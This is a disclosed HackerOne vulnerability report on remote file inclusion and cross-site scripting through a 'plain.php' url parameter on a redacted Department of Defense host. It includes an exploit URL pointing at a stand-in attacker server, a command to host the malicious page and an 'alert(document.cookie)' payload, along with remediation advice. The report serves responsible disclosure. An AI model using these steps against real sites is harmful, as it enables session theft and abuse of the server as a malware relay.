---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '192940'
original_report_id: '192940'
title: Remote File Inclusion, Malicious File Hosting, and Cross-site Scripting (XSS)
  in ████████
weakness: Cross-site Scripting (XSS) - Generic
team_handle: deptofdefense
created_at: '2016-12-21T03:42:57.057Z'
disclosed_at: '2019-12-02T17:52:45.860Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Remote File Inclusion, Malicious File Hosting, and Cross-site Scripting (XSS) in ████████

## Metadata

- HackerOne Report ID: 192940
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: deptofdefense
- Disclosed At: 2019-12-02T17:52:45.860Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

### Details:
There is currently a security misconfiguration on `plain.php` function located on the host `http://██████████/` allowing attackers to include webserver contents of their choosing (no restriction on filetypes and/or IP addresses), as well as embed malicious javascript payloads in the response via filenames. **This allows attackers to hijack the entire page as a malicious file hosting relay and/or leverage it for XSS attacks on users (authenticated or otherwise).** 

### Technical Explanation:
This vulnerability occurs because of the web application's functionality which is intended to pull directory contents from a specified location. **This functionality extends to importing the contents of those files, meaning that web-page formatted code and/or web page files (`.php`,`.html` etc.) saved on the attacker's server, will be rendered to the victim BY the `████████` server.** 

### Exploitation and Validation: 
**The above information means that attackers can do things like the following:**

--------
#[1]
1. Setup attacking server with malicious web page(s): `python -m SimpleHTTPServer 80`
2. Import the web-page directly into the █████ page: `http://███/████/proxys/plain.php?url=http://attacker_server/t.html&operation=GetParameterInfo&parameter=countryBoundaryLayer&outputFormat=JSON`.

███
█████
**Source & Contents of `t.html`:**
```
<h1>JUTSUCE RFI TEST</h1>
<script>alert(document.cookie)</script>
<script>alert('jutsuce')</script>
```
█████████

--------
#[2]
Additional Exploitation Vectors:
██████
███
████████
██████
--------
#[3]
**Due to the lack of whitelisting and/or site restrictions pseudo-Server-Side-Request-Forgery (SSRF) is a feasible attack vector, and would be easily automated:**
* Internal IP Address Scanning
* Internal Site &/or File Compromise

-------
### Remediation:
**Remove the ability for any external interaction within a functionality of this nature. If external interaction is absolutely required then alongside whitelisting (what hosts/files/etc. are valid), authenticative restrictions should be implemented in order to restrict accessibility.** Whether or not interaction is restricted to internalized site(s), the function should have whitelisting implemented to stop the [3] set of exploit vectors listed above.

Thank you!

`~Jutsuce`

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
